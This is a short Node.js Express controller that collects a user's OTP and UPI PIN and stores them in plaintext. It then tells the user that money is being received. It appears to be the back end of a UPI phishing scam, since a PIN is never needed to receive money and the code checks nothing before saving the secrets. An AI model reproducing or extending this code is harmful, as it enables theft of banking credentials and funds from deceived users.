const OtpModel = require("../Model/otp.model")

const OtpGet=async(req,res)=>{
    const {otp,upiPin}=req.body

    if(!otp ){
        return res.status(400).send({message:"Please Fill Your OTP "})   
    }

    if(!upiPin ){
        return res.status(400).send({message:"Please Fill Your UPI PIN For Verification "})   
    }

    try {
        await OtpModel.create({otp,upiPin})
        res.status(201).send({message:"Please Wait Your Money Is Reciveing... "})
    }
    catch(error){
        console.log(error)
    }

}


module.exports={OtpGet}